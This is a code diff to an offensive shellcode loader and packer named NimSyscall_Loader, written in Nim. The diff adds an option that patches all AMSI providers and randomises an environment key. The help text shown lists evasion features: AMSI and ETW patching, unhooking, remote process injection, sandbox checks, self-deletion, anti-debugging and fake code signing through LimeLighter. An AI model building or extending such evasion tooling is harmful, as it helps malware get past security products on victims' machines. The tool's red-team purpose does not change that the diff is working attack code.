@@ -61,7 +61,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.6
 
 Usage:
-  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --large --noRES --dll --dllexportfunc=<exportfuncname> --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --sleep=<10> --shellcode --localCreateThread --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate]
+  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --large --noRES --dll --dllexportfunc=<exportfuncname> --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --sleep=<10> --shellcode --localCreateThread --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -98,6 +98,7 @@ Options:
   --obfuscate    Compile the Nim binary via Denim to make use of LLVM obfuscation
   --sgn    Encode shellcode via SGN before encrypting it´
   --replace    Replace common nim IoC's in the loader like the string 'nim'
+  --AMSIProviderPatch    Patch all AMSI Providers instead of 'amsi.dll' (https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf)
   --sandbox value    Include Sandbox Checks of your choice into the loader:
                      Domain -> Only execute if the target domain is == the --domain parameter's domain / If --domain is not set, it will only execute on non-domain joined systems
                      DomainJoined -> Only execute if the target is connected to ANY domain - you don't need to know the target's domain for this one
@@ -154,11 +155,15 @@ if (paramStr(1) == "-h"):
     echo helpmenu
     quit(0)
 
+proc rndStr: string =
+    for _ in 0.. 10:
+      add(result, char(rand(int('a') .. int('z'))))
+
 var 
     filename: string = ""
     packerPath = os.getAppDir()
     outfile: string = packerPath
-    envkey: string = "TARGETDOMAIN"
+    envkey: string = rndStr()
     dll_out: bool = false
     dllfunc: string = ""
     dllexportfunctions: seq[string]
@@ -174,6 +179,7 @@ var
     arguments: string = ""
     embeddedArguments : bool = false
     AMSI: bool = true
+    AMSIProviderPatch: bool = false
     ETW: bool = true
     COMVARETW: bool = false
     shellcode: bool = true
@@ -259,10 +265,6 @@ if args["--dllexportfunc"]:
   dllfunc = fmt"{dllfuncstring}"
   dllexportfunctions = dllfunc.split(',')
 
-proc rndStr: string =
-    for _ in 0.. 10:
-      add(result, char(rand(int('a') .. int('z'))))
-
 var customLoaderName: string = rndStr()
 
 when system.hostOS == "windows":
@@ -290,6 +292,10 @@ if args["--remotepatchETW"]:
   remoteETWpatch = true
 
 if args["--noAMSI"]:
+  AMSI = false
+
+if args["--AMSIProviderPatch"]:
+  AMSIProviderPatch = true
   AMSI = false
 
 if args["--noETW"]:
@@ -1167,7 +1173,7 @@ stub.add(Cryptstub3)
 stub.add(getRandStub())
 stub.add(getRandStub())
 
-if (AMSI or ETW or peload or (localinject == false) or selfdelete):
+if (AMSI or AMSIProviderPatch or ETW or peload or (localinject == false) or selfdelete):
     if (not noDInvoke): stub.add(DInvokeLoadLibraryAGetProcAddress)
     if (selfdelete):
         if (not noDInvoke): stub.add(DInvokeSelfDeleteStubs)
@@ -1176,6 +1182,8 @@ stub.add(getRandStub())
 if (localinject):
     if (AMSI):
         stub.add(AMSIStub)
+    elif(AmsiProviderPatch):
+        stub.add(AMSIProviderPatchStub)
     if (ETW):
         if (COMVARETW):
             stub.add(ETWCOMVARStub)
@@ -1568,8 +1576,6 @@ if (sign):
         else:
             discard os.execShellCmd(fmt"{packerPath}/LimeLighter/Limelighter -Domain {signdomain} -I {outfile} -O {outfile}.Signed.exe")
     when system.hostOS == "windows":
-        #var command = fmt"{packerPath}\LimeLighter\Limelighter.exe -Domain {signdomain} -I {packerPath}\{outfile} -O {packerPath}\{outfile}.Signed.exe"
-        #echo command
         if(dll_out):
             discard os.execShellCmd(fmt"{packerPath}\LimeLighter\Limelighter.exe -Domain {signdomain} -I {outfile} -O {outfile}.Signed.dll")
         else:
